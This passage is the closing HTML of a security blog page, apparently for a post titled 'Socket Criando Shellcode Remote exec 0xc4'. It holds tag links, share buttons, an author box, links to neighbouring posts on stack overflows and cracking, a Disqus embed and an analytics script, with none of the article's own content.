					<a href="/tags.html#linux-ref">
					linux <span>(5)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#execute-ref">
					execute <span>(1)</span>
					
					</a>
				</li>
			
		  
		  
		</ul>
		  

		<hr>

		<div>
      <section class="share col-sm-6">
        <h4 class="section-title">Share Post</h4>
        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=Socket Criando Shellcode Remote exec 0xc4&via=mh4x0f"
           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
          <i class="fa fa-twitter fa-lg"></i>
          Twitter
        </a>
        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
          <i class="fa fa-facebook fa-lg"></i>
          Facebook
        </a>
        <a class="btn btn-default btn-sm gplus"
           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
          <i class="fa fa-google-plus fa-lg"></i>
          Google+
        </a>
      </section>

      <section class="col-sm-6 author">
        <img src="http://avatars.githubusercontent.com/u/6795613" style="width:80px;height:80px;" class="img-rounded author-image" />
        <h4 class="section-title author-name">mh4x0f</h4>
        <p class="author-bio">One 0x41414141 worth a thousand words</p>
      </section>
    </div>

    <div class="clearfix"></div>

		<ul class="pager">
		  
		  <li class="previous"><a href="/exploit%20developer/2014/06/27/Stack%20Overflow%20Na%20pratica%200x04.html" title="Stack Overflow Na pratica 0x04">&larr; Previous</a></li>
		  
		  
		  <li class="next"><a href="/cracking/2014/07/06/Engenharia%20Reversa%20crackeando%20Software%20na%20Unha%200x01.html" title="Engenharia Reversa [Basic]">Next &rarr;</a></li>
		  
		</ul>

		<hr>
	</div>
	
	<div class="col-sm-2 sidebar-2">
	
	</div>
</article>
<div class="clearfix"></div>



    
<div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = 'mh4x0fblog';

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>





		<footer>
			<hr/>
			<p>
				&copy; 2015 mh4x0f with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
			</p>
		</footer>
	</div>

	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="/assets/js/app.js"></script>
</body>
</html>



<!-- Asynchronous Google Analytics snippet -->
<script>
  var _gaq = _gaq || [];
  var pluginUrl =
 '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
  _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
  _gaq.push(['_setAccount', 'mh4x0f']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>

